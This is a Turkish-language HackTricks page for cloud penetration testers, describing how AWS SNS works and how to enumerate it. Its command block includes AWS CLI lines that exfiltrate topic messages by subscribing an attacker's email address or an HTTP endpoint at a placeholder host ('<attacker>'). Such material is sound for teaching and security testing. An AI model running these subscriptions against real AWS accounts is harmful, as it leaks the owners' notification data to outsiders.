# AWS - SNS Enum

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklam görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS), **tamamen yönetilen bir mesajlaşma servisi** olarak tanımlanmaktadır. Hem **uygulama-uygulama** (A2A) hem de **uygulama-kullanıcı** (A2P) iletişim türlerini destekler.

A2A iletişim için temel özellikler arasında **yayın/abone (pub/sub) mekanizmaları** bulunmaktadır. Bu mekanizmalar, yüksek verimlilik sağlamak için kritik olan **konuları** tanıtır. Bu özellik, dağıtılmış sistemler, mikroservisler ve olay odaklı serverless mimarileri içeren senaryolarda oldukça avantajlıdır. Bu konuları kullanarak, yayıncı sistemler mesajları **geniş bir abone sistem yelpazesi**ne etkin bir şekilde dağıtabilir, fanout mesajlaşma desenini kolaylaştırır.

### **SQS ile Farkı**

**SQS**, **kuyruk tabanlı** bir servistir ve **noktadan-noktaya** iletişime izin vererek mesajların **tek bir tüketici** tarafından işlenmesini sağlar. **En az bir kez teslimat** sunar, standart ve FIFO kuyrukları destekler ve mesajların yeniden deneme ve gecikmeli işleme için saklanmasına izin verir.\
Öte yandan, **SNS** bir **yayın/abone tabanlı servistir** ve **birçok kişiye** iletişimi sağlayarak mesajları **çoklu abonelere** aynı anda yayınlar. **E-posta, SMS, Lambda fonksiyonları ve HTTP/HTTPS** gibi çeşitli abonelik uç noktalarını destekler ve hedeflenen mesaj iletimi için filtreleme mekanizmaları sağlar.\
Her iki servis de dağıtılmış sistemlerde bileşenler arasındaki bağı koparmayı sağlarken, SQS kuyruk tabanlı iletişime odaklanırken, SNS olay odaklı, fanout iletişim desenlerine vurgu yapar.

### **Numaralandırma**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
**Not:** Eğer konu **FIFO türünde ise**, yalnızca **SQS** protokolünü kullanan aboneler kullanılabilir (HTTP veya HTTPS kullanılamaz).

Ayrıca, `--topic-arn` içinde bölge bulunsa bile doğru bölgeyi **`--region`** içinde belirttiğinizden emin olun, aksi takdirde erişiminiz olmadığına dair bir hata alırsınız ancak sorun bölgededir.
{% endhint %}

#### Kimlik Doğrulamasız Erişim

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### Yetki Yükseltme

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### Saldırı Sonrası

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Kalıcılık

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
